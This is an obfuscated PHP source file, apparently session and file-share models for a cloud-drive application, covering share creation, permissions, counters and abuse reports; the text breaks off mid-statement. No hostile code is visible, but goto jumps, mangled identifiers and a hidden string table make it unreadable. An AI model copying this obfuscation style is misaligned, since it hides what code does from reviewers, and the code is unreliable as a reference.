<?php
 goto cç•ƒÀ…; E™§å‚ö†ë: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\155\137\163\x65\x73\x73\151\x6f\x6e"; public function get($‚ó›ä) { $®å—£ÃÙ =& $_SERVER[±³—úê]; $Û‹Ç¨Ãí = $this->where(array($®å—£ÃÙ[2114] => $‚ó›ä))->find(); if (!is_array($Û‹Ç¨Ãí)) { return !1; } return $Û‹Ç¨Ãí[$®å—£ÃÙ[171]]; } public function set($æÇçâ, $Åíæ€¦ó, $Ö¼ŒÓÖÆ = 3600) { $ó¢ãÌ› =& $_SERVER[±³—úê]; $…Ó‹İ‹ = array($ó¢ãÌ›[2114] => $æÇçâ, $ó¢ãÌ›[2014] => $Åíæ€¦ó, $ó¢ãÌ›[2115] => $Ö¼ŒÓÖÆ + time()); if (Session::get($ó¢ãÌ›[2116])) { $…Ó‹İ‹[$ó¢ãÌ›[1775]] = Session::get($ó¢ãÌ›[2116]); } else { $…Ó‹İ‹[$ó¢ãÌ›[1775]] = 0; } if ($this->get($æÇçâ)) { return $this->where(array($ó¢ãÌ›[2114] => $æÇçâ))->save($…Ó‹İ‹); } else { return $this->add($…Ó‹İ‹, array(), !0); } } public function remove($Ö˜ÉÓá) { return $this->where(array($_SERVER[±³—úê][2114] => $Ö˜ÉÓá))->delete(); } public function clearTimeout() { return $this->where($_SERVER[±³—úê][2117] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\145"; protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\x54\151\155\x65", "\x74\151\155\145", "\x69\156\x73\145\162\x74\x2c\x75\160\x64\x61\164\x65", "\146\x75\156\143\164\151\x6f\156"), array("\143\162\x65\x61\x74\145\124\x69\155\145", "\x74\x69\x6d\x65", "\151\156\163\x65\x72\164", "\x66\x75\x6e\143\x74\x69\x6f\x6e"), array("\157\160\164\x69\x6f\156\163", '', "\151\156\x73\145\x72\164\54\165\x70\x64\141\x74\x65\x2c\x73\x65\x6c\145\x63\x74", "\x6a\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($íÏÌ®¾) { $·Ô€£¨ =& $_SERVER[±³—úê]; $³ÁºÓ”Ò = isset($íÏÌ®¾[0]) ? $íÏÌ®¾[0] : !1; $‘´€£¦£ = $·Ô€£¨[2118] . USER_ID; return array($·Ô€£¨[2119] => array(USER_ID, $·Ô€£¨[2120], $‘´€£¦£), $·Ô€£¨[2059] => array($³ÁºÓ”Ò, $·Ô€£¨[2121], $‘´€£¦£)); } protected function listSimple() { $¹“¥èåÜ = array($_SERVER[±³—úê][1775] => USER_ID); $—¦ÆĞóõ = $this->field($this->fieldList)->where($¹“¥èåÜ)->select(); return $—¦ÆĞóõ ? $—¦ÆĞóõ : array(); } protected function getInfo($¡•œŒ²à, $ƒõ ªğ = false, $Œ²Ê¿Ò = '') { $”Çóö‹î =& $_SERVER[±³—úê]; if ($ƒõ ªğ) { return $this->_getShareInfo(array($”Çóö‹î[679] => $¡•œŒ²à)); } $¼µË®£¯ = $this->cacheFunctionGet($”Çóö‹î[2061], $¡•œŒ²à, $Œ²Ê¿Ò); return $¼µË®£¯; } public function getInfoByHash($çò•ä½) { return $this->_getShareInfo(array($_SERVER[±³—úê][2122] => $çò•ä½)); } public function getInfoByPath($²û†…¿ä) { $–™äÛÇ¶ =& $_SERVER[±³—úê]; $‡ÉÙı = array($–™äÛÇ¶[1775] => USER_ID, $–™äÛÇ¶[193] => $²û†…¿ä); return $this->_getShareInfo($‡ÉÙı); } public function getInfoBySourcePath($ÔÀ™…Ò©) { $ÖşÙ·“º =& $_SERVER[±³—úê]; $¯Ğ§¢¿ = array($ÖşÙ·“º[1775] => USER_ID, $ÖşÙ·“º[1259] => $ÔÀ™…Ò©); return $this->_getShareInfo($¯Ğ§¢¿); } private function _getShareInfo($ö§ÖÌ†²) { $»µıôçŠ =& $_SERVER[±³—úê]; $ŠºªÜš” = $this->where($ö§ÖÌ†²)->find(); if (!$ŠºªÜš”) { return !1; } $ö§ÖÌ†² = array($»µıôçŠ[679] => $ŠºªÜš”[$»µıôçŠ[679]]); $¤²ìê˜ = $»µıôçŠ[2123]; $è˜ÀÉ‘Û = Model($»µıôçŠ[680])->order($»µıôçŠ[486])->field($¤²ìê˜)->where($ö§ÖÌ†²)->select(); if ($ŠºªÜš”[$»µıôçŠ[193]] == $»µıôçŠ[240]) { $ŠºªÜš”[$»µıôçŠ[90]] = IO::info($ŠºªÜš”[$»µıôçŠ[1259]]); } else { $ŠºªÜš”[$»µıôçŠ[90]] = Model($»µıôçŠ[1423])->pathInfo($ŠºªÜš”[$»µıôçŠ[193]]); } $ŠºªÜš”[$»µıôçŠ[2124]] = $è˜ÀÉ‘Û; return $ŠºªÜš”; } protected function getInfoAuth($¨œ«Ü²Ä) { $îşô¬€Ä =& $_SERVER[±³—úê]; $©šÈ”Æ· = $this->getInfo($¨œ«Ü²Ä); if ($©šÈ”Æ·[$îşô¬€Ä[1775]] == USER_ID) { $©šÈ”Æ·[$îşô¬€Ä[498]] = $©šÈ”Æ·[$îşô¬€Ä[90]][$îşô¬€Ä[498]]; } else { $©šÈ”Æ·[$îşô¬€Ä[498]] = Model($îşô¬€Ä[578])->authMake($©šÈ”Æ·[$îşô¬€Ä[2124]]); } return $©šÈ”Æ·; } protected function listData($¦áüÊ– = null, $³ÂÇî¦Ä = 300) { $Æ’¬µÁÎ =& $_SERVER[±³—úê]; $ÆÎŞÁä = array(array($Æ’¬µÁÎ[573] => array($Æ’¬µÁÎ[1091], 0), $Æ’¬µÁÎ[677] => array($Æ’¬µÁÎ[1091], 0), $Æ’¬µÁÎ[2125] => $Æ’¬µÁÎ[2077])); if ($¦áüÊ– == $Æ’¬µÁÎ[2126]) { $ÆÎŞÁä = array($Æ’¬µÁÎ[573] => 1); } else { if ($¦áüÊ– == $Æ’¬µÁÎ[1244]) { $ÆÎŞÁä = array($Æ’¬µÁÎ[677] => 1); } } $ÆÎŞÁä[$Æ’¬µÁÎ[1775]] = USER_ID; $ºƒ­ ê = $this->where($ÆÎŞÁä)->selectPage($³ÂÇî¦Ä); return $ºƒ­ ê; } protected function listToMe($ó‹¶î÷Ö = 300) { $¸«Âñ¿š =& $_SERVER[±³—úê]; $Ô¼ı–îÇ = Model($¸«Âñ¿š[2127])->userGroupParents(USER_ID); $‰€íÂ» = array($¸«Âñ¿š[662] => SourceModel::TYPE_USER, $¸«Âñ¿š[580] => USER_ID); if ($Ô¼ı–îÇ) { $‰€íÂ» = array(array($¸«Âñ¿š[662] => SourceModel::TYPE_USER, $¸«Âñ¿š[580] => USER_ID), array($¸«Âñ¿š[662] => SourceModel::TYPE_GROUP, $¸«Âñ¿š[580] => array($¸«Âñ¿š[7], $Ô¼ı–îÇ)), $¸«Âñ¿š[2125] => $¸«Âñ¿š[2077]); } $‰æÕàÖ¦ = Model($¸«Âñ¿š[680])->where($‰€íÂ»)->selectPage($ó‹¶î÷Ö); $îÍÄ ş = array_to_keyvalue_group($‰æÕàÖ¦[$¸«Âñ¿š[456]], $¸«Âñ¿š[679]); if (!$îÍÄ ş) { return $‰æÕàÖ¦; } $œ²û²ĞŞ = $¸«Âñ¿š[2128]; $‰€íÂ» = array($¸«Âñ¿š[679] => array($¸«Âñ¿š[503], array_keys($îÍÄ ş)), $¸«Âñ¿š[1775] => array($¸«Âñ¿š[1093], $¸«Âñ¿š[240])); $¦‡ÇöÂò = $this->field($œ²û²ĞŞ)->where($‰€íÂ»)->select(); foreach ($¦‡ÇöÂò as $¢è”ºÉ® => &$ÒÔöåÙÆ) { $ÒÔöåÙÆ[$¸«Âñ¿š[2124]] = $îÍÄ ş[$ÒÔöåÙÆ[$¸«Âñ¿š[679]]]; } unset($ÒÔöåÙÆ); $ÌŸùéÓ¼ = array($¸«Âñ¿š[2129] => $¦‡ÇöÂò, $¸«Âñ¿š[2130] => $‰æÕàÖ¦[$¸«Âñ¿š[453]]); return $ÌŸùéÓ¼; } protected function shareAdd($›”ÈªêÄ, $§ÙƒÕı) { $³¾µÁÂÜ =& $_SERVER[±³—úê]; $ùÎ ¡éÖ = $this->_addShareData($›”ÈªêÄ, $§ÙƒÕı); if (!empty($§ÙƒÕı[$³¾µÁÂÜ[2131]])) { $this->_shareAuthSet($ùÎ ¡éÖ, $§ÙƒÕı[$³¾µÁÂÜ[2131]]); } $this->shareEventAdd($›”ÈªêÄ, $§ÙƒÕı, $³¾µÁÂÜ[2132]); return $ùÎ ¡éÖ; } protected function shareAddSystem($éÊ”Ş, $Æş±‚¶) { $‹”‰ªú¬ =& $_SERVER[±³—úê]; $ñüŸÒÉì = $this->_addShareData($éÊ”Ş, $Æş±‚¶, $‹”‰ªú¬[191]); $this->_shareAuthSet($ñüŸÒÉì, $Æş±‚¶[$‹”‰ªú¬[2131]]); return $ñüŸÒÉì; } private function shareEventAdd($ª–éÄÅº, $èÆÙ¬ş, $‰Œ±Ñê = "\141\x64\144") { $¹Ì­¶Î³ =& $_SERVER[±³—úê]; if (!$ª–éÄÅº || $ª–éÄÅº == $¹Ì­¶Î³[240]) { return; } if ($‰Œ±Ñê == $¹Ì­¶Î³[2132]) { if ($èÆÙ¬ş[$¹Ì­¶Î³[573]] == $¹Ì­¶Î³[91]) { Model($¹Ì­¶Î³[647])->eventShare($ª–éÄÅº, $¹Ì­¶Î³[2133]); } if ($èÆÙ¬ş[$¹Ì­¶Î³[677]] == $¹Ì­¶Î³[91]) { Model($¹Ì­¶Î³[647])->eventShare($ª–éÄÅº, $¹Ì­¶Î³[2134]); } return; } $®šÕô‹à = $this->getInfoByPath($ª–éÄÅº); $·÷àã¯Š = $¹Ì­¶Î³[2135]; if ($®šÕô‹à[$¹Ì­¶Î³[573]] == $¹Ì­¶Î³[240] && $èÆÙ¬ş[$¹Ì­¶Î³[573]] == $¹Ì­¶Î³[91]) { $·÷àã¯Š = $¹Ì­¶Î³[2133]; } if ($®šÕô‹à[$¹Ì­¶Î³[573]] == $¹Ì­¶Î³[91] && $èÆÙ¬ş[$¹Ì­¶Î³[573]] == $¹Ì­¶Î³[240]) { $·÷àã¯Š = $¹Ì­¶Î³[2136]; } if ($®šÕô‹à[$¹Ì­¶Î³[677]] == $¹Ì­¶Î³[240] && $èÆÙ¬ş[$¹Ì­¶Î³[677]] == $¹Ì­¶Î³[91]) { $·÷àã¯Š = $¹Ì­¶Î³[2134]; } if ($®šÕô‹à[$¹Ì­¶Î³[677]] == $¹Ì­¶Î³[91] && $èÆÙ¬ş[$¹Ì­¶Î³[677]] == $¹Ì­¶Î³[240]) { $·÷àã¯Š = $¹Ì­¶Î³[2137]; } Model($¹Ì­¶Î³[647])->eventShare($ª–éÄÅº, $·÷àã¯Š); return; } private function _addShareData($ñ¾ü·ıõ, $¬Ûı£é = array(), $Ã¦öÅÛ– = false) { $²‰¨¾’Ğ =& $_SERVER[±³—úê]; $ô‡ù´¤¶ = $Ã¦öÅÛ– == $²‰¨¾’Ğ[191] ? 0 : USER_ID; $•¤İ¥«¸ = array($²‰¨¾’Ğ[502] => $ñ¾ü·ıõ, $²‰¨¾’Ğ[1766] => $ô‡ù´¤¶); if ($ñ¾ü·ıõ == 0) { $•¤İ¥«¸ = array($²‰¨¾’Ğ[2138] => $¬Ûı£é[$²‰¨¾’Ğ[1259]], $²‰¨¾’Ğ[1766] => $ô‡ù´¤¶); } if ($–‹ùı‡ = $this->where($•¤İ¥«¸)->find()) { return $–‹ùı‡[$²‰¨¾’Ğ[679]]; } if ($ñ¾ü·ıõ == 0) { $Å‹Îæƒ = array($²‰¨¾’Ğ[32] => get_path_this($¬Ûı£é[$²‰¨¾’Ğ[87]])); } else { $Å‹Îæƒ = Model($²‰¨¾’Ğ[905])->sourceInfo($ñ¾ü·ıõ); if (!$Å‹Îæƒ) { return !1; } } if (!$¬Ûı£é[$²‰¨¾’Ğ[1661]]) { $¬Ûı£é[$²‰¨¾’Ğ[1661]] = $Å‹Îæƒ[$²‰¨¾’Ğ[32]]; } $äØ¤„Ç® = array($²‰¨¾’Ğ[1766] => $ô‡ù´¤¶, $²‰¨¾’Ğ[502] => $ñ¾ü·ıõ, $²‰¨¾’Ğ[1661] => $²‰¨¾’Ğ[12], $²‰¨¾’Ğ[573] => 0, $²‰¨¾’Ğ[677] => 0, $²‰¨¾’Ğ[1259] => $²‰¨¾’Ğ[12], $²‰¨¾’Ğ[393] => $²‰¨¾’Ğ[12], $²‰¨¾’Ğ[968] => $²‰¨¾’Ğ[12], $²‰¨¾’Ğ[2139] => 0, $²‰¨¾’Ğ[2140] => 0, $²‰¨¾’Ğ[841] => 0, $²‰¨¾’Ğ[2141] => $²‰¨¾’Ğ[12], $²‰¨¾’Ğ[2122] => $²‰¨¾’Ğ[12]); $›“¼‰ª¡ = explode($²‰¨¾’Ğ[50], $²‰¨¾’Ğ[2142]); foreach ($›“¼‰ª¡ as $ƒÑ÷şšã) { if (!isset($¬Ûı£é[$ƒÑ÷şšã])) { continue; } $äØ¤„Ç®[$ƒÑ÷şšã] = $¬Ûı£é[$ƒÑ÷şšã]; } $«ìÀ“ŸÁ = $this->add($äØ¤„Ç®); $Ä©ŠÖ½œ = array($²‰¨¾’Ğ[2122] => short_id($«ìÀ“ŸÁ)); $this->where(array($²‰¨¾’Ğ[2143] => $«ìÀ“ŸÁ))->save($Ä©ŠÖ½œ); return $«ìÀ“ŸÁ; } private function _shareAuthSet($šøÔğ›ø, $¢˜ØÑËÍ) { $Óµò¨â =& $_SERVER[±³—úê]; if (!is_array($¢˜ØÑËÍ)) { return !1; } $»šÂ¥Ø’ = Model($Óµò¨â[2087]); $»šÂ¥Ø’->where(array($Óµò¨â[679] => $šøÔğ›ø))->delete(); $é—áèÁ = array(); foreach ($¢˜ØÑËÍ as $ÒˆŸÙúè) { $şóáæš = SourceModel::TYPE_USER; if ($ÒˆŸÙúè[$Óµò¨â[190]] == SourceModel::TYPE_GROUP) { $şóáæš = SourceModel::TYPE_GROUP; } $–‹úÀ«ú = array($Óµò¨â[679] => $šøÔğ›ø, $Óµò¨â[190] => $şóáæš, $Óµò¨â[580] => intval($ÒˆŸÙúè[$Óµò¨â[580]]), $Óµò¨â[2083] => 0, $Óµò¨â[2144] => -1); if ($ÒˆŸÙúè[$Óµò¨â[2083]]) { $–‹úÀ«ú[$Óµò¨â[2083]] = $ÒˆŸÙúè[$Óµò¨â[2083]]; } else { if ($ÒˆŸÙúè[$Óµò¨â[2144]]) { $–‹úÀ«ú[$Óµò¨â[2144]] = $ÒˆŸÙúè[$Óµò¨â[2144]]; } } $é—áèÁ[] = $–‹úÀ«ú; } return $»šÂ¥Ø’->addAll($é—áèÁ, array(), !0); } public function numViewAdd($…Œ«ç©î) { $ı´Ú¶í™ =& $_SERVER[±³—úê]; $ò³ğÉšÕ = array($ı´Ú¶í™[2143] => $…Œ«ç©î); $this->where($ò³ğÉšÕ)->setAdd($ı´Ú¶í™[2139]); } public function numDownloadAdd($›†¶ÍŠ’) { $ôšÇºªú =& $_SERVER[±³—úê]; $Ú§¶³ªâ = array($ôšÇºªú[2143] => $›†¶ÍŠ’); $this->where($Ú§¶³ªâ)->setAdd($ôšÇºªú[2140]); } protected function shareEdit($²¡ãäåİ, $¤°´Äßè) { $¢æö¦¢î =& $_SERVER[±³—úê]; $¾•†Û—» = $this->getInfo($²¡ãäåİ); if (!$¾•†Û—») { return !1; } $this->_checkLinkShare($¤°´Äßè, $¾•†Û—»); $–ÑÑ¼ºø = array(); $ƒßç¬µ– = explode($¢æö¦¢î[50], $¢æö¦¢î[2145]); foreach ($ƒßç¬µ– as $±¹è ÑŠ) { if (!array_key_exists($±¹è ÑŠ, $¤°´Äßè)) { continue; } $–ÑÑ¼ºø[$±¹è ÑŠ] = $¤°´Äßè[$±¹è ÑŠ]; } $this->shareEventAdd($¾•†Û—»[$¢æö¦¢î[193]], $¤°´Äßè, $¢æö¦¢î[1944]); $this->where(array($¢æö¦¢î[2143] => $²¡ãäåİ))->save($–ÑÑ¼ºø); if (isset($¤°´Äßè[$¢æö¦¢î[2131]])) { $this->_shareAuthSet($²¡ãäåİ, $¤°´Äßè[$¢æö¦¢î[2131]]); } return !0; } private function _checkLinkShare($é§é˜ææ, $Ïä—Åİ) { $ı”ø·úë =& $_SERVER[±³—úê]; if ($é§é˜ææ[$ı”ø·úë[573]] != $ı”ø·úë[91]) { return; } $Çèãò = $Ïä—Åİ[$ı”ø·úë[90]][$ı”ø·úë[193]]; if ($Ïä—Åİ[$ı”ø·úë[90]][$ı”ø·úë[33]] != $ı”ø·úë[242]) { $› ±‘Ş£ = $this->_folderReport($Çèãò); if (!$› ±‘Ş£) { return; } show_json(LNG($ı”ø·úë[2146]) . $ı”ø·úë[2147] . $› ±‘Ş£, !1); } $äİç¶« = Model($ı”ø·úë[905])->fileInfoGet($Ïä—Åİ[$ı”ø·úë[90]][$ı”ø·úë[193]]); if (!$äİç¶«) { return; } $ÒÊ±¡³‹ = $this->shareFileMeta($äİç¶«[$ı”ø·úë[552]]); if (isset($ÒÊ±¡³‹[$ı”ø·úë[461]]) && $ÒÊ±¡³‹[$ı”ø·úë[461]] == $ı”ø·úë[91]) { show_json(LNG($ı”ø·úë[2148]), !1); } } private function _folderReport($¶¡ÍÂÅŸ) { $ÍÊĞ¾÷Ù =& $_SERVER[±³—úê]; $éãƒÅ·À = array($ÍÊĞ¾÷Ù[552] => array($ÍÊĞ¾÷Ù[1091], 0), $ÍÊĞ¾÷Ù[830] => 3); $„¦ŠèÌ = Model($ÍÊĞ¾÷Ù[2149])->where($éãƒÅ·À)->field($ÍÊĞ¾÷Ù[552])->select(); if (!$„¦ŠèÌ) { return !1; } $„¦ŠèÌ = array_to_keyvalue($„¦ŠèÌ, $ÍÊĞ¾÷Ù[12], $ÍÊĞ¾÷Ù[552]); $Ş½ä¬âê = $ÍÊĞ¾÷Ù[50] . $¶¡ÍÂÅŸ . $ÍÊĞ¾÷Ù[50]; $éãƒÅ·À = array($ÍÊĞ¾÷Ù[552] => array($ÍÊĞ¾÷Ù[7], $„¦ŠèÌ), $ÍÊĞ¾÷Ù[595] => array($ÍÊĞ¾÷Ù[470], "\x25{$Ş½ä¬âê}\x25"), $ÍÊĞ¾÷Ù[516] => 0); $£›™×Ëè = Model($ÍÊĞ¾÷Ù[905])->where($éãƒÅ·À)->field($ÍÊĞ¾÷Ù[2150])->find(); if (!$£›™×Ëè) { return !1; } $Ş…Ì‹ºû = substr($£›™×Ëè[$ÍÊĞ¾÷Ù[595]], strpos($£›™×Ëè[$ÍÊĞ¾÷Ù[595]], $Ş½ä¬âê)); $éãƒÅ·À = array($ÍÊĞ¾÷Ù[193] => array($ÍÊĞ¾÷Ù[7], trim($Ş…Ì‹ºû, $ÍÊĞ¾÷Ù[50]))); $–‹ÍÆ™á = Model($ÍÊĞ¾÷Ù[905])->where($éãƒÅ·À)->field($ÍÊĞ¾÷Ù[32])->select(); $ÇÍçˆöÛ = array_to_keyvalue($–‹ÍÆ™á, $ÍÊĞ¾÷Ù[12], $ÍÊĞ¾÷Ù[32]); $ÇÍçˆöÛ[] = $£›™×Ëè[$ÍÊĞ¾÷Ù[32]]; return implode($ÍÊĞ¾÷Ù[8], $ÇÍçˆöÛ); } protected function remove($Äê¸§¾) { $—ÂÙÌ×ã =& $_SERVER[±³—úê]; $¦ÆÀöÈö = is_array($Äê¸§¾) ? $Äê¸§¾ : array($Äê¸§¾); for ($ˆ­£Œ¨ = 0; $ˆ­£Œ¨ < count($¦ÆÀöÈö); $ˆ­£Œ¨++) { $©®Éåé„ = $this->getInfo($¦ÆÀöÈö[$ˆ­£Œ¨]); if ($©®Éåé„[$—ÂÙÌ×ã[677]] == $—ÂÙÌ×ã[91]) { Model($—ÂÙÌ×ã[647])->eventShare($©®Éåé„[$—ÂÙÌ×ã[193]], $—ÂÙÌ×ã[2137]); } if ($©®Éåé„[$—ÂÙÌ×ã[573]] == $—ÂÙÌ×ã[91]) { Model($—ÂÙÌ×ã[647])->eventShare($©®Éåé„[$—ÂÙÌ×ã[193]], $—ÂÙÌ×ã[2136]); } } if (is_array($Äê¸§¾)) { $Äê¸§¾ = array($—ÂÙÌ×ã[7], $Äê¸§¾); } $¯Ï†øç = array($—ÂÙÌ×ã[679] => $Äê¸§¾); $¤åİÂ = $this->where($¯Ï†øç)->delete(); if ($¤åİÂ) { Model($—ÂÙÌ×ã[680])->where(array($—ÂÙÌ×ã[679] => $Äê¸§¾))->delete(); } return $¤åİÂ; } protected function removeBySource($ëçÊõá) { $› èšª´ =& $_SERVER[±³—úê]; $÷Î–ê€ = array($› èšª´[502] => array($› èšª´[503], $ëçÊõá)); $ñá­ÚØ– = $this->field($› èšª´[679])->where($÷Î–ê€)->select(); $ñá­ÚØ– = array_to_keyvalue($ñá­ÚØ–, $› èšª´[12], $› èšª´[679]); if (!$ñá­ÚØ–) { return; } $÷Î–ê€ = array($› èšª´[2143] => array($› èšª´[503], $ñá­ÚØ–)); $this->where($÷Î–ê€)->delete(); Model($› èšª´[680])->where($÷Î–ê€)->delete(); } public function listAll($Çˆ˜É³ş) { $“›‹¸ã® =& $_SERVER[±³—úê]; $Ãù»¾š = array(); if ($Çˆ˜É³ş[$“›‹¸ã®[1775]]) { $Ãù»¾š[$“›‹¸ã®[1775]] = $Çˆ˜É³ş[$“›‹¸ã®[1775]]; } if ($Çˆ˜É³ş[$“›‹¸ã®[840]]) { $ÛêğĞ = $Çˆ˜É³ş[$“›‹¸ã®[841]] ? $Çˆ˜É³ş[$“›‹¸ã®[841]] : strtotime(date($“›‹¸ã®[2151])); $Ãù»¾š[$“›‹¸ã®[243]] = array($“›‹¸ã®[419], array($Çˆ˜É³ş[$“›‹¸ã®[840]], $ÛêğĞ)); } if ($Çˆ˜É³ş[$“›‹¸ã®[33]]) { $Ãù»¾š[$Çˆ˜É³ş[$“›‹¸ã®[33]]] = 1; } else { $Ãù»¾š[] = array($“›‹¸ã®[573] => array($“›‹¸ã®[1091], 0), $“›‹¸ã®[677] => array($“›‹¸ã®[1091], 0), $“›‹¸ã®[2125] => $“›‹¸ã®[2077]); } if ($Çˆ˜É³ş[$“›‹¸ã®[2073]]) { $Ãù»¾š[] = array($“›‹¸ã®[2122] => $Çˆ˜É³ş[$“›‹¸ã®[2073]], $“›‹¸ã®[1661] => array($“›‹¸ã®[470], "\x25{$Çˆ˜É³ş[$“›‹¸ã®[2073]]}\x25"), $“›‹¸ã®[2125] => $“›‹¸ã®[2077]); } $¶Ã™¥±„ = $this->_makeOrder()->where($Ãù»¾š)->selectPage(20); if (empty($¶Ã™¥±„[$“›‹¸ã®[456]])) { return array(); } $this->_listDataApply($¶Ã™¥±„[$“›‹¸ã®[456]]); return $¶Ã™¥±„; } public function listDataApply($õå¢ÛÓ²) { $this->_listDataApply($õå¢ÛÓ²); return $õå¢ÛÓ²; } private function _listDataApply(&$şÆÍÜîÖ) { $–Î³Ÿ =& $_SERVER[±³—úê]; $ « º¶¬ = array_to_keyvalue($şÆÍÜîÖ, $–Î³Ÿ[12], $–Î³Ÿ[1775]); $ì²øÁĞ° = Model($–Î³Ÿ[608])->userListInfo(array_unique($ « º¶¬)); $ÜÉÂ„µß = array_to_keyvalue($şÆÍÜîÖ, $–Î³Ÿ[12], $–Î³Ÿ[193]); $õÚŠÉè = Model($–Î³Ÿ[905])->sourceListInfo($ÜÉÂ„µß, !0); foreach ($şÆÍÜîÖ as $ŞÕßÇÅ => &$ñÊºûÍ) { $®èÚìÇå = $ñÊºûÍ[$–Î³Ÿ[1775]]; $ñÊºûÍ[$–Î³Ÿ[2152]] = $ì²øÁĞ°[$®èÚìÇå] ? $ì²øÁĞ°[$®èÚìÇå] : !1; $Ó¸²˜èú = $ñÊºûÍ[$–Î³Ÿ[193]]; $ñÊºûÍ[$–Î³Ÿ[90]] = $õÚŠÉè[$Ó¸²˜èú] ? $õÚŠÉè[$Ó¸²˜èú] : !1; if ($ñÊºûÍ[$–Î³Ÿ[90]][$–Î³Ÿ[516]] == $–Î³Ÿ[91]) { unset($şÆÍÜîÖ[$ŞÕßÇÅ]); } if ($ñÊºûÍ[$–Î³Ÿ[90]] != $–Î³Ÿ[240] && !$ñÊºûÍ[$–Î³Ÿ[90]]) { unset($şÆÍÜîÖ[$ŞÕßÇÅ]); } } unset($ñÊºûÍ); $şÆÍÜîÖ = array_values($şÆÍÜîÖ); } private function _makeOrder($­Ü¦øÖ• = '') { $ËÄ³ò±Æ =& $_SERVER[±³—úê]; $¿®±Òá¶ = array($ËÄ³ò±Æ[243], $ËÄ³ò±Æ[841], $ËÄ³ò±Æ[2139], $ËÄ³ò±Æ[2140]); $îõë†» = array($ËÄ³ò±Æ[534] => $ËÄ³ò±Æ[535], $ËÄ³ò±Æ[536] => $ËÄ³ò±Æ[537]); $÷’šÀ¨Ğ = Input::get($ËÄ³ò±Æ[541], $ËÄ³ò±Æ[7], $ËÄ³ò±Æ[508], $¿®±Òá¶); $‡¨Â‹Ä¢ = Input::get($ËÄ³ò±Æ[542], $ËÄ³ò±Æ[7], $ËÄ³ò±Æ[2153], array($ËÄ³ò±Æ[2070], $ËÄ³ò±Æ[536])); $‡¨Â‹Ä¢ = $îõë†»[$‡¨Â‹Ä¢]; $­Ü¦øÖ• = $­Ü¦øÖ• . "{$÷’šÀ¨Ğ}\x20{$‡¨Â‹Ä¢}"; return $this->order($­Ü¦øÖ•); } public function reportAdd($Èß„Ö×ó) { $ ¢ÈĞ–Î =& $_SERVER[±³—úê]; $•î¾„¥È = array($ ¢ÈĞ–Î[679] => $Èß„Ö×ó[$ ¢ÈĞ–Î[679]], $ ¢ÈĞ–Î[1775] => USER_ID); if (Model($ ¢ÈĞ–Î[2149])->where($•î¾„¥È)->find()) { return !1; } $á¸û×‚Ñ = array($ ¢ÈĞ–Î[679] => $Èß„Ö×ó[$ ¢ÈĞ–Î[679]], $ ¢ÈĞ–Î[1661] => $Èß„Ö×ó[$ ¢ÈĞ–Î[1661]], $ ¢ÈĞ–Î[193] => $Èß„Ö×ó[$ ¢ÈĞ–Î[193]], $ ¢ÈĞ–Î[552] => $Èß„Ö×ó[$ ¢ÈĞ–Î[552]], $ ¢ÈĞ–Î[1775] => USER_ID, $ ¢ÈĞ–Î[33] => $Èß„Ö×ó[$ ¢ÈĞ–Î[33]], $ ¢ÈĞ–Î[537] => $Èß„Ö×ó[$ ¢ÈĞ–Î[537]]); return Model($ ¢ÈĞ–Î[2149])->add($á¸û×‚Ñ); } public function reportList($íâï) { $ò“üªÓ =& $_SERVER[±³—úê]; $ã¤ÊÁ•É = array(); if ($íâï[$ò“üªÓ[840]]) { $‰ ¡¡ = $íâï[$ò“üªÓ[841]] ? $íâï[$ò“üªÓ[841]] : strtotime(date($ò“üªÓ[2151])); $ã¤ÊÁ•É[$ò“üªÓ[243]] = array($ò“üªÓ[419], array($íâï[$ò“üªÓ[840]], $‰ ¡¡)); } if (isset($íâï[$ò“üªÓ[33]]) && in_array($íâï[$ò“üªÓ[33]], array($ò“üªÓ[91], $ò“üªÓ[521], $ò“üªÓ[2154], $ò“üªÓ[2155], $ò“üªÓ[2156]))) { $ã¤ÊÁ•É[$ò“üªÓ[33]] = $íâï[$ò“üªÓ[33]]; } if (isset($íâï[$ò“üªÓ[830]]) && in_array($íâï[$ò“üªÓ[830]], array($ò“üªÓ[240], $ò“üªÓ[91], $ò“üªÓ[521], $ò“üªÓ[2154]))) { $ã¤ÊÁ•É[$ò“üªÓ[830]] = $íâï[$ò“üªÓ[830]]; } $õéáå¤Ñ = Input::get($ò“üªÓ[542], $ò“üªÓ[7], $ò“üªÓ[2153], array($ò“üªÓ[2070], $ò“üªÓ[536])); $…ÌÍÚéË = array($ò“üªÓ[534] => $ò“üªÓ[535], $ò“üªÓ[536] => $ò“üªÓ[537]); $¿ĞªÁ¤ = $ò“üªÓ[2157] . $…ÌÍÚéË[$õéáå¤Ñ]; $ñö°˜Š´ = Model($ò“üªÓ[2149])->where($ã¤ÊÁ•É)->order($¿ĞªÁ¤)->selectPage(20); if (empty($ñö°˜Š´[$ò“üªÓ[456]])) { return array(); } $Â·ÏÁì° = array_to_keyvalue_group($ñö°˜Š´[$ò“üªÓ[456]], $ò“üªÓ[830], $ò“üªÓ[679]); if (!empty($Â·ÏÁì°[0])) { $íâï = $Â·ÏÁì°[0]; $ã¤ÊÁ•É = array($ò“üªÓ[679] => array($ò“üªÓ[7], $íâï)); $å¿°¢Ôì = $this->where($ã¤ÊÁ•É)->field($ò“üªÓ[679])->select(); $å¿°¢Ôì = array_to_keyvalue($å¿°¢Ôì, $ò“üªÓ[12], $ò“üªÓ[679]); $¯ÄßÙ = array_diff($íâï, $å¿°¢Ôì); if (!empty($¯ÄßÙ)) { foreach ($ñö°˜Š´[$ò“üªÓ[456]] as $ßâ­¸Ú => $•ƒ«»æÄ) { if (in_array($•ƒ«»æÄ[$ò“üªÓ[679]], $¯ÄßÙ)) { unset($ñö°˜Š´[$ò“üªÓ[456]][$ßâ­¸Ú]); } } } } $this->_listDataApply($ñö°˜Š´[$ò“üªÓ[456]]); return $ñö°˜Š´; } public function reportStatus($äüô¡ÛŸ) { $¾ûµ‘–€ =& $_SERVER[±³—úê]; $ÇéÙ— = array($¾ûµ‘–€[486] => $äüô¡ÛŸ[$¾ûµ‘–€[486]]); $í¶§íúÑ = Model($¾ûµ‘–€[2149])->where($ÇéÙ—)->field($¾ûµ‘–€[2158])->find(); if (!$í¶§íúÑ) { return !1; } $»¥¦şÔ¿ = array($¾ûµ‘–€[830] => $äüô¡ÛŸ[$¾ûµ‘–€[830]]); if ($äüô¡ÛŸ[$¾ûµ‘–€[830]] == $¾ûµ‘–€[2154] && 